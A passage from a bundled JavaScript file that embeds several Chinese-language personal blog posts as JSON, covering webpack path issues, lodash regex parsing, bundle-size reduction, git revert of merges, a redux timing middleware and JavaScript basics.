/&gt;</code></p>\\n<p>再给<code>html-loader</code>定义一个<code>root</code>，告诉html从哪个文件夹去抓取这些图片。</p>\\n<ul>\\n<li>js图片路径</li>\\n</ul>\\n<p>使用require</p>\\n<ul>\\n<li>css图片路径</li>\\n</ul>\\n<p>如果不需要<code>webpack</code>打包图片，那么将<code>css-loader</code>的<code>url</code>设为<code>false</code></p>\\n<p>如果需要<code>webpack</code>打包，那么要将<code>url</code>设置为<code>true</code>，这样对于你<code>css</code>中每一个图片，<code>css-loader</code>会去抓取，并且用<code>file-loader</code>(或者<code>url-loader</code>)解析，\\n解析成功，打包，重命名后，将新的路径写入到你的<code>css</code></p>\\n<p>遇到的一个问题就是需要对<code>file-loader</code>的<code>publicPath</code>进行配置</p>\\n<p>例如<code>css</code>中<code>background:url(../../assets/img/xxx.png)</code></p>\\n<p>如果不配置，那么打包后的文件路径为<code>background:url(./image/xxx-xxx.png)</code>，这里<code>image</code>是我的图片输出目录</p>\\n<p>注意这是个相对路径，最后在<code>html</code>打开实际路径为<code>/css/image/xxx-xxx.png</code>， 而我需要的是<code>/image/xxx-xxx.png</code></p>\\n<p>因此对<code>publicPath</code>配置为<code>/</code>， 可以解决问题。</p>\\n","toc":[{"anchor":"lu-jing-keng","level":4,"text":"路径坑"}],"relatedTags":null,"created_at":"2019-08-03","timeArr":[2019,7,3,0,0,0,0],"title":"一次webpack搭建遇到的坑","uuid":"f7dd6e266b1a5e851a141bd30cacb677f6cb8562","summary":"<h4>路径坑：</h4>\\n<ul>\\n<li>html图片路径：</li>\\n</ul>\\n<p>要利用<code>html-loader</code>的 <code>attr</code> 处理，只有<code>attr</code>覆盖到了，才会打包它。</p>\\n<p>例如<code>img</code>的<code>src</code>(img:src) 和<code>link</code>的<code>ref</code>(link:ref)，例如<code>favicon</code>，和一些用了<code>data-src</code>的，例如`lazylo...</p>","slug":"yi-ci-webpack-da-jian-yu-dao-de-keng","sha":"af5982279e618f8e78c8acbd9a329c7a3d2f6087"}')},654:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">tco</span>(<span class=\\"hljs-params\\">f</span>) </span>{\\n            <span class=\\"hljs-keyword\\">var</span> value;\\n            <span class=\\"hljs-keyword\\">var</span> active = <span class=\\"hljs-literal\\">false</span>;\\n            <span class=\\"hljs-keyword\\">var</span> accumulated = [];\\n            <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">accumulator</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n                accumulated.push(<span class=\\"hljs-built_in\\">arguments</span>);\\n                <span class=\\"hljs-comment\\">// 当递归的时候，检查active，清除调用栈</span>\\n                <span class=\\"hljs-keyword\\">if</span> (!active) {\\n                    active = <span class=\\"hljs-literal\\">true</span>;\\n                    <span class=\\"hljs-keyword\\">while</span> (accumulated.length) {\\n                        value = f.apply(<span class=\\"hljs-keyword\\">this</span>, accumulated.shift());\\n                        <span class=\\"hljs-built_in\\">console</span>.log(value)\\n                    }\\n                    active = <span class=\\"hljs-literal\\">false</span>;\\n                    <span class=\\"hljs-keyword\\">return</span> value;\\n                }\\n            };\\n        }\\n\\n        <span class=\\"hljs-keyword\\">var</span> sum = tco(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">x, y</span>) </span>{\\n            <span class=\\"hljs-keyword\\">if</span> (y &gt; <span class=\\"hljs-number\\">0</span>) {\\n                <span class=\\"hljs-keyword\\">return</span> sum(x + <span class=\\"hljs-number\\">1</span>, y - <span class=\\"hljs-number\\">1</span>)\\n            } <span class=\\"hljs-keyword\\">else</span> {\\n                <span class=\\"hljs-keyword\\">return</span> x\\n            }\\n        });\\n\\n        <span class=\\"hljs-built_in\\">console</span>.log(sum(<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">3</span>))</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-17","timeArr":[2018,8,17,0,0,0,0],"title":"一段模拟尾调用的代码","uuid":"486e17cd17cf6034e71874e022bd9b11474cb15f","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">tco</span>(<span class=\\"hljs-params\\">f</span>) </span>{\\n            <span class=\\"hljs-keyword\\">var</span> value;\\n            <span class=\\"hljs-keyword\\">var</span> active = <span class=\\"hljs-literal\\">false</span>;\\n            <span class=\\"hljs-keyword\\">var</span> accumulated = [];\\n            <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">accumulator</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   ...</code></pre>","slug":"yi-duan-mo-ni-wei-diao-yong-de-dai-ma","sha":"d4ccfc9c818cb82435d9ad49679ef1c39a597b27"}')},655:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yue-du-lodash-zhong-yi-duan-chang-zheng-ze-li-jie-bi-ji\\">阅读lodash中一段长正则理解笔记</h2>\\n<p>在lodash源码<code>/.internal/stringToPath.js</code>中：</p>\\n<p>这里英文是原注释，中文是简单的翻译下，后面会详细解释：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> rePropName = <span class=\\"hljs-built_in\\">RegExp</span>(\\n  <span class=\\"hljs-comment\\">// Match anything that isn\'t a dot or bracket.</span>\\n  <span class=\\"hljs-comment\\">// 匹配任意 非.和非[]的任意值(1个以上)</span>\\n  <span class=\\"hljs-string\\">\'[^.[\\\\\\\\]]+\'</span> + <span class=\\"hljs-string\\">\'|\'</span> +\\n  <span class=\\"hljs-comment\\">// Or match property names within brackets.</span>\\n  <span class=\\"hljs-comment\\">// 匹配 [</span>\\n  <span class=\\"hljs-string\\">\'\\\\\\\\[(?:\'</span> +\\n    <span class=\\"hljs-comment\\">// Match a non-string expression.</span>\\n    <span class=\\"hljs-comment\\">// 匹配(非\\" 或者 \')和后面任意数量值，即非字符串</span>\\n    <span class=\\"hljs-string\\">\'([^\\"\\\\\'].*)\'</span> + <span class=\\"hljs-string\\">\'|\'</span> +\\n    <span class=\\"hljs-comment\\">// Or match strings (supports escaping characters).</span>\\n    <span class=\\"hljs-comment\\">// 匹配字符串(支持转义字符)</span>\\n    <span class=\\"hljs-string\\">\'([\\"\\\\\'])((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*?)\\\\\\\\2\'</span> +\\n  <span class=\\"hljs-string\\">\')\\\\\\\\]\'</span>+ <span class=\\"hljs-string\\">\'|\'</span> +\\n  <span class=\\"hljs-comment\\">// Or match \\"\\" as the space between consecutive dots or empty brackets.</span>\\n  <span class=\\"hljs-comment\\">// 匹配连续的点或者中括号，然后匹配值为\\"\\"</span>\\n  <span class=\\"hljs-string\\">\'(?=(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\])(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\]|$))\'</span>\\n, <span class=\\"hljs-string\\">\'g\'</span>)</code></pre></code></pre>\\n<h2 id=\\"li-jie\\">理解</h2>\\n<ul>\\n<li>第一行</li>\\n</ul>\\n<p><code>&#39;[^.[\\\\\\\\]]+&#39; + &#39;|&#39; +</code></p>\\n<p>一个兜底的匹配，意思是匹配除了<code>.</code>和<code>[]</code>的任意值，后面的如果能匹配则会覆盖这个(因为后面的匹配字符更多)；</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-string\\">\'abc\'</span>.match(<span class=\\"hljs-regexp\\">/([^a]+|a(.)c)/</span>)\\n\\n<span class=\\"hljs-comment\\">// 这里两个都能匹配，前面匹配值为\'bc\'，后面的匹配值为\'abc\'，因此后面的优先匹配</span></code></pre></code></pre>\\n<p>这里要注意的就是在字符串中转义需要写两次<code>\\\\\\\\</code>，而且这里<code>.</code>是不需要转义，后面那个<code>]</code>需要转义因为构成了歧义。</p>\\n<ul>\\n<li>第二行</li>\\n</ul>\\n<p><code>&#39;\\\\\\\\[(?:&#39; +</code></p>\\n<p>这里有一个<code>?:</code>，意思是在这个括号内，匹配值但不需要储存匹配结果</p>\\n<ul>\\n<li>第三行</li>\\n</ul>\\n<p><code>&#39;([^&quot;\\\\&#39;].*)&#39; + &#39;|&#39; +</code></p>\\n<p>没有什么特别的...</p>\\n<ul>\\n<li>第四行</li>\\n</ul>\\n<p><code>&#39;([&quot;\\\\&#39;])((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*?)\\\\\\\\2&#39; +</code></p>\\n<p>先看<code>([&quot;\\\\&#39;])</code></p>\\n<p>也就是匹配双|单引号；</p>\\n<p>接着分两种匹配：</p>\\n<h5 id=\\"4-1\\">4-1</h5>\\n<p><code>((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]</code></p>\\n<p>这里首先是<code>?!</code>，正向否定预查，意思是只有(同一个括号内)后面的不满足，才能去匹配前面的值；</p>\\n<p>后面是<code>\\\\\\\\2</code>，转义后就是<code>\\\\2</code>，意思就是反向引用第二个括号储存的结果，就是<code>([&quot;\\\\&#39;])</code>；</p>\\n<p>因此<code>(?!\\\\\\\\2)</code>这里就是只要不是双|单引号，因为第四行最后有<code>*</code>，因此这里会抓取任意多个不是引号的字符，然后储存到括号匹配内（后面使用时的<a href=\\"#%E5%8F%82%E6%95%B0%E5%90%AB%E4%B9%89\\">第四个参数</a>)）；</p>\\n<p>能抓取到这些值后，就去匹配前面的值，前面的值就是<code>([&quot;\\\\&#39;])</code>，还是双|单引号，如果不能抓取这些值(例如连续多个引号)，则无法匹配；</p>\\n<p><code>\\\\\\\\\\\\\\\\</code>转义后就是<code>\\\\\\\\</code>，意思就是匹配一个斜杠<code>\\\\</code>，这里就是不匹配<code>\\\\</code>；</p>\\n<p>所以这句的意思就是：匹配单个引号后面的非引号值，并且它后面不能是斜杠<code>\\\\</code></p>\\n<h5 id=\\"4-2\\">4-2</h5>\\n<p><code>|\\\\\\\\\\\\\\\\.</code></p>\\n<p>转义后就是<code>\\\\\\\\.</code>，意思就是匹配一个斜杠<code>\\\\</code>后面可以是任意值（<em>其实就是匹配转义字符</em>，例如\\\\a）</p>\\n<p>最后<code>*?)\\\\\\\\2</code></p>\\n<p>这里用了非贪婪模式，量词后面加<code>?</code>，再搭配后面的<code>\\\\\\\\2</code>（前面说了，也就是引号）。</p>\\n<p>整体的意思就是：<strong><em>前面2种匹配(<a href=\\"#4-1\\">4-1</a>,<a href=\\"#4-2\\">4-2</a>)，任何一种匹配后，匹配任意位数，直到出现第一个引号</em></strong>。</p>\\n<ul>\\n<li>第五行</li>\\n</ul>\\n<p><code>&#39;)\\\\\\\\]&#39;+ &#39;|&#39; +</code></p>\\n<p>这里匹配了<code>]</code>，就是补充了第二行匹配的<code>[</code>；因此我们知道从第二行到第五行的匹配，都是对在中括号<code>[]</code>内匹配类型的处理。</p>\\n<ul>\\n<li>第六行</li>\\n</ul>\\n<p><code>&#39;(?=(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\])(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\]|$))&#39;</code></p>\\n<p><code>?=</code>是正向肯定预查，即符后面匹配的，去匹配前面的值，但它前面没有值，就会匹配为空<code>&quot;&quot;</code>；</p>\\n<p>因此这行含义就是：出现了<code>..</code>或者<code>[][]</code>或者单独的<code>.</code>和单独的<code>[]</code>会转换成<code>&quot;&quot;</code></p>\\n<ul>\\n<li>第七行</li>\\n</ul>\\n<p><code>, &#39;g&#39;)</code></p>\\n<p>全局匹配</p>\\n<h2 id=\\"shi-yong\\">使用</h2>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>string.replace(rePropName, (match, expression, quote, subString) =&gt; {\\n<span class=\\"hljs-keyword\\">let</span> key = match\\n<span class=\\"hljs-keyword\\">if</span> (quote) {\\n  <span class=\\"hljs-comment\\">// 将 \\\\\\\\ 转换成 \\\\</span>\\n  key = subString.replace(reEscapeChar, <span class=\\"hljs-string\\">\'$1\'</span>)\\n}\\n<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (expression) {\\n  <span class=\\"hljs-comment\\">// 去两端空格</span>\\n  key = expression.trim()\\n}\\nresult.push(key)\\n})</code></pre></code></pre>\\n<p>这里<code>replace</code>第二个参数是函数，因此函数的参数按以下顺序排列：</p>\\n<ol>\\n<li><p>匹配值</p>\\n</li>\\n<li><p>匹配过程中括号内储存(匹配)的值，有多个则占用多个参数位置</p>\\n<p> ...</p>\\n</li>\\n<li><p>匹配值对应的索引</p>\\n</li>\\n<li><p>输入的字符串</p>\\n</li>\\n</ol>\\n<h5 id=\\"can-shu-han-yi\\">参数含义</h5>\\n<p><code>match</code>是整个表达式匹配的值</p>\\n<p><code>expression</code>匹配<em>中括号内</em>非字符串 </p>\\n<p><code>quote</code>匹配<em>中括号内</em>第一个引号(后面不能也是引号，就是不能重复) </p>\\n<p><code>subString</code>是<em>中括号内</em>具体字符串的值(无引号)</p>\\n<p>因此：</p>\\n<p><code>if (quote)</code>说明中括号内是字符串，有可能有转义，要进行处理。</p>\\n<p><code>if (expression)</code>说明中括号内是非字符串，是属性值，需要去空格处理。</p>\\n<h2 id=\\"zong-jie\\">总结</h2>\\n<p>通过这个正则，学到了：</p>\\n<ol>\\n<li>正则匹配以匹配字符多的优先。</li>\\n<li><code>\\\\1</code>, <code>\\\\2</code>, <code>?!</code>, <code>?=</code>, <code>?:</code>, 在字符串中<code>\\\\\\\\\\\\\\\\</code>的使用。</li>\\n<li>使用 <code>?!</code>，遇到重复值，取消后面部分匹配(从而减少匹配优先权)。<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 这里a设定不能为重复值</span>\\n</code></pre></code></pre>\\n</li>\\n</ol>\\n<p>&quot;abc&quot;.match(/a((?!a).)<em>/)\\n// 匹配值：abc\\n&quot;aabc&quot;.match(/a((?!a).)</em>/)\\n// 匹配值：a</p>\\n<pre><code><pre class=\\"hljs\\"><code>4. 使用`?=`置空匹配值\\n```js\\n// 只要连续出现abcd 则匹配为空\\n\\n\'abced\'.match(/(?=.*abcd.*)|.*/)\\n// 匹配值：abced\\n\'eabcdd\'.match(/(?=.*abcd.*)|.*/)\\n// 匹配值：\'\'</code></pre></code></pre><ol start=\\"5\\">\\n<li>replace第二参数函数的使用，括号的匹配有值会增加函数参数的数量。</li>\\n</ol>\\n","toc":[{"anchor":"yue-du-lodash-zhong-yi-duan-chang-zheng-ze-li-jie-bi-ji","level":2,"text":"阅读lodash中一段长正则理解笔记"},{"anchor":"li-jie","level":2,"text":"理解"},{"anchor":"4-1","level":5,"text":"4-1"},{"anchor":"4-2","level":5,"text":"4-2"},{"anchor":"shi-yong","level":2,"text":"使用"},{"anchor":"can-shu-han-yi","level":5,"text":"参数含义"},{"anchor":"zong-jie","level":2,"text":"总结"}],"relatedTags":null,"created_at":"2018-07-18","timeArr":[2018,6,18,0,0,0,0],"title":"一个长正则的深入理解","uuid":"cdf39a26b776d98ab203524d376b062840672373","summary":"<h4>阅读lodash中一段长正则理解笔记</h4>\\n<p>在lodash源码<code>/.internal/stringToPath.js</code>中：</p>\\n<p>这里英文是原注释，中文是简单的翻译下，后面会详细解释：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> rePropName = <span class=\\"hljs-built_in\\">RegExp</span>(\\n  <span class=\\"hljs-comment\\">// Match anything that isn\'t a do...</span></code></pre>","slug":"yi-ge-chang-zheng-ze-de-shen-ru-li-jie","sha":"784356b84252e1f80acd38952d47176e1e4a8836"}')},656:function(n){n.exports=JSON.parse('{"content":"<p>这是一个个人博客，基于<code>antd</code>搭建，这个项目构建流程如下：</p>\\n<ol>\\n<li>先启动<code>fetch-blog-serve</code>，这是一个能将你的<code>repertory</code>的blog内容拉去到本地，并且写入<code>xxx.json</code>。</li>\\n<li>在写入之前会生成一个列表，包含每一篇blog的标题、日期、标签、摘要、sha值(唯一性判断)。</li>\\n<li>前端通过获取数据，对数据进行处理，分配给各个板块。</li>\\n<li>其中渲染<code>.MD</code>使用了<code>markdown-it</code>和<code>highlight.js</code>(<code>react-markdown</code>使用时出现了一些格式偏差，就没有用了)。</li>\\n<li>UI组件都是使用<code>antd</code>。</li>\\n</ol>\\n<p>构建开始，我使用了<code>webpack-bundle-analyzer</code>来查看各个bundle的大小。</p>\\n<p>因为是<code>create-react-app</code>构建，需要使用<code>react-app-rewire</code>。</p>\\n<p>第一次构建，总大小2.76M</p>\\n<p><img src=\\"/article/img/init.png\\" alt=\\"\\"></p>\\n<p>很显然是不行的，一个个人博客而已...</p>\\n<p>因为我们使用了<code>antd</code>,而当这么写<code>import {Button} from &#39;antd&#39;</code>的时候，会加载所有组件，</p>\\n<p>使用<code>babel-plugin-import</code>作为webpack插件，加入到<code>config-overrides.js</code>中，这里的config指\\nwebpack的config配置。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>config = injectBabelPlugin(\\n  [<span class=\\"hljs-string\\">\'import\'</span>, { <span class=\\"hljs-attr\\">libraryName</span>: <span class=\\"hljs-string\\">\'antd\'</span>, <span class=\\"hljs-attr\\">libraryDirectory</span>: <span class=\\"hljs-string\\">\'es\'</span>, <span class=\\"hljs-attr\\">style</span>: <span class=\\"hljs-string\\">\'css\'</span> }],\\n  config,\\n);</code></pre></code></pre>\\n<p>具体见<a href=\\"https://ant.design/docs/react/use-with-create-react-app-cn#%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE\\">官网</a></p>\\n<p>第二次构建，效果很好，减少了将近800K，总大小1.92M</p>\\n<p><img src=\\"/article/img/first.png\\" alt=\\"\\"></p>\\n<p>看了看最多的就是<code>highlight.js</code>，这是一个针对代码语言进行高亮，美化的工具。</p>\\n<blockquote>\\n<p>当默认加载 <code>import hljs from &quot;highlight.js&quot;</code>的时候，会加载所有语言的渲染组件。</p>\\n</blockquote>\\n<p>应该使用按需加载(这里只加载js的渲染组件)：</p>\\n<pre><code><pre class=\\"hljs\\"><code>import hljs from \'highlight.js/lib/highlight\';\\nimport javascript from \'highlight.js/lib/languages/javascript\';\\nhljs.registerLanguage(\'javascript\', javascript);</code></pre></code></pre><p>第三次构建，又减了800K，总大小1.12M</p>\\n<p><img src=\\"/article/img/second.png\\" alt=\\"\\"></p>\\n<p>很明显一个大大的<code>dist.js</code>刺激着我的眼睛。</p>\\n<p>往上一看，原来是<code>antd</code>的Icon组件，这是怎么回事？上官网一查</p>\\n<blockquote>\\n<p>⚠3.9.0 之后我们全量引入了所有图标，导致 antd 默认的包体积有一定增加，我们会在不远的未来增加新的 API 来实现图标的按需使用，更多相关讨论可关注：<a href=\\"https://github.com/ant-design/ant-design/issues/12011\\">#12011</a>。</p>\\n</blockquote>\\n<p>看了看讨论的情况，目前最好的临时解决方案就是，通过webpack的<code>resolve.alias</code>，让<code>antd</code>里的所有组件的\\n图标获取转到一个自定义文件中，这个自定义文件将会按需导出。</p>\\n<p>具体看这里:<a href=\\"https://github.com/ant-design/ant-design/issues/12011#issuecomment-420038579\\">https://github.com/ant-design/ant-design/issues/12011#issuecomment-420038579</a></p>\\n<p>搭建好自定义的<code>icons.js</code>后，还是在<code>config-overrides.js</code>中，</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>config.resolve.alias[<span class=\\"hljs-string\\">\'@ant-design/icons/lib/dist$\'</span>]=path.resolve(__dirname, <span class=\\"hljs-string\\">\'./src/icons.js\'</span>)</code></pre></code></pre>\\n<p>第四次构建，再次减少400K后，总大小为693K，这个结果是可以接受的。</p>\\n<p><img src=\\"/article/img/final.png\\" alt=\\"\\"></p>\\n<p>这就是我的一次项目构建体积压缩全过程。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-14","timeArr":[2018,9,14,0,0,0,0],"title":"一个create-react-app项目构建体积的压缩","uuid":"f410e8013460016ef21db0425ddcc6ef131809a0","summary":"<p>这是一个个人博客，基于<code>antd</code>搭建，这个项目构建流程如下：</p>\\n<ol>\\n<li>先启动<code>fetch-blog-serve</code>，这是一个能将你的<code>repertory</code>的blog内容拉去到本地，并且写入<code>xxx.json</code>。</li>\\n<li>在写入之前会生成一个列表，包含每一篇blog的标题、日期、标签、摘要、sha值(唯一性判断)。</li>\\n<li>前...</li>\\n</ol>","slug":"yi-ge-create-react-app-xiang-mu-gou-jian-ti-ji-de-ya-suo","sha":"e0bc2c78310a534ecec19f96adac09f5c5cb835a"}')},657:function(n){n.exports=JSON.parse('{"content":"<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master)\\n           \\\\            /                     \\n            d1  --&gt;  d2                                   </code></pre></code></pre><p>现在在v4，d2有bug，想先取消合并</p>\\n<p>使用`git reset &quot;fault merge&quot;，v4也不存在了</p>\\n<p>使用 <code>git revert &quot;fault merge&quot;</code>， 不会影响到v4</p>\\n<p>revert后是这样的，目前在revert merge</p>\\n<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master) -&gt;revert merge\\n           \\\\            /                     \\n            d1  --&gt;  d2  </code></pre></code></pre><p>继续添加文件</p>\\n<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master) -&gt;revert merge -&gt;v5\\n           \\\\            /                     \\n            d1  --&gt;  d2  --&gt;d3 --&gt;d4</code></pre></code></pre><p>现在在v5 需要合并 dev</p>\\n<p>直接<code>git merge dev</code> 只能合并 d3和d4</p>\\n<p>有2种办法，</p>\\n<ol>\\n<li><p>在d1,和d2上手动修改，即使添加一个空格；然后回到master，<code>git merge dev</code>，处理冲突便可（每个文件都修改太麻烦）</p>\\n</li>\\n<li><p>再次revert到之前revert的部分，<code>git revert &quot;revert merge&quot;</code>,然后会发现d1和d2又回来了(最初的有bug的版本)，再<code>git merge dev</code>将修正的版本合并进来，处理冲突即可</p>\\n</li>\\n</ol>\\n<blockquote>\\n<p>另： 第2步反过来也可，先<code>git merge dev</code>，将改动过的合并进来，再<code>git revert &quot;revert merge&quot;</code>，处理冲突</p>\\n</blockquote>\\n<hr>\\n<blockquote>\\n<p>自己注：git-test目录中，目前正在v5，dev的dev-1，dev-2是被revert的，dev-2做了修改，可以使用第2或者第3种方法</p>\\n</blockquote>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-01","timeArr":[2018,8,1,0,0,0,0],"title":"一个关于GIT撤销合并的处理revert","uuid":"c717f697562ea9e27b08040a52e05db0718b1a50","summary":"<pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master)\\n           \\\\            /                     \\n            d1  --&gt;  d2                               ...</code></pre>","slug":"yi-ge-guan-yu-GIT-che-xiao-he-bing-de-chu-li-revert","sha":"1de2e1722337b507aecf967ac8e888cae31f7bbb"}')},658:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ge-ji-lu-redux-mei-ci-dispatch-hao-shi-zhong-jian-jian\\">一个记录redux每次dispatch耗时中间件</h2>\\n<h3 id=\\"yuan-ma\\">源码</h3>\\n<p><a href=\\"https://gist.github.com/clarkbw/966732806e7a38f5b49fd770c62a6099\\">源码地址</a></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> timing = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">store</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">if</span>(performance.mark===<span class=\\"hljs-literal\\">undefined</span>) <span class=\\"hljs-keyword\\">return</span> next(action)\\n  performance.mark(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_start`</span>);\\n  <span class=\\"hljs-keyword\\">let</span> result = next(action);\\n  performance.mark(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_end`</span>);\\n  performance.measure(\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>`</span>,\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_start`</span>,\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_end`</span>\\n  );\\n  <span class=\\"hljs-keyword\\">return</span> result;\\n};</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"shi-yong\\">使用</h3>\\n<p>如果需要记录包括中间件和dispatch的耗时，放在<code>applyMiddleWare</code>最前面：</p>\\n<p><code>applyMiddleWare(timing,thunk,...milldeware)</code></p>\\n<p>如果只记录dispatch的，放在最后面：</p>\\n<p><code>applyMiddleWare(thunk,middleware1,...,timing)</code></p>\\n<p>然后可以通过<code>performance.getEntriesByType(&#39;measure&#39;)</code>获取所有耗时的集合(Array)。</p>\\n","toc":[{"anchor":"yi-ge-ji-lu-redux-mei-ci-dispatch-hao-shi-zhong-jian-jian","level":2,"text":"一个记录redux每次dispatch耗时中间件"},{"anchor":"yuan-ma","level":3,"text":"源码"},{"anchor":"shi-yong","level":3,"text":"使用"}],"relatedTags":null,"created_at":"2018-07-17","timeArr":[2018,6,17,0,0,0,0],"title":"一个记录redux的dispatch耗时的中间件","uuid":"8e74b1491a2006b6a1642598cc517a267cfa577b","summary":"<h4>一个记录redux每次dispatch耗时中间件</h4>\\n<h4>源码</h4>\\n<p><a href=\\"https://gist.github.com/clarkbw/966732806e7a38f5b49fd770c62a6099\\">源码地址</a></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> timing = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">store</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> {\\n...</code></pre>","slug":"yi-ge-ji-lu-redux-de-dispatch-hao-shi-de-zhong-jian-jian","sha":"78386b134e2b2ff73ad010cc436a6bcaadc22582"}')},659:function(n){n.exports=JSON.parse('{"content":"<p>一些JS基础(4)</p>\\n<h4 id=\\"an-zhi-chuan-di-he-an-yin-yong-chuan-di\\">按值传递和按引用传递</h4>\\n<p>按值传递的例子：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByValue</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByValue(a);\\npassByValue(b)\\na   <span class=\\"hljs-comment\\">// 5</span>\\nb   <span class=\\"hljs-comment\\">// {a:1}</span></code></pre></code></pre>\\n<p>按引用传递的例子(虚构)：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByReference</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByReference(a);\\npassByReference(b)\\na   <span class=\\"hljs-comment\\">// 999</span>\\nb   <span class=\\"hljs-comment\\">// 999</span></code></pre></code></pre>\\n<h4 id=\\"jsonstringify\\">JSON.stringify()</h4>\\n<p>支持转换安全的JSON结构</p>\\n<p>不安全的 JSON 值：</p>\\n<p> <code>undefined</code>、 <code>function</code>、 <code>symbol</code>\\n（ES6+）和包含循环引用（对象之间相互引用，形成一个无限循环）的对象都不符合 JSON\\n结构标准</p>\\n<p>那么遇到不安全JSON值怎么处理呢？有2种方法</p>\\n<p>一、</p>\\n<p>使用<code>toJSON</code>，如果对象内部用<code>toJSON</code>方法，<code>JSON.stringify</code>的时候回首先执行<code>toJSON</code>，\\n再对其返回值进行处理</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>}\\n<span class=\\"hljs-built_in\\">Object</span>.setPrototypeOf(a,{<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>})\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a)   <span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"y\\":2}\\"</span>\\n\\na.toJSON=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-comment\\">// 注意：返回的是对象，不是字符串</span>\\n  <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">z</span>:<span 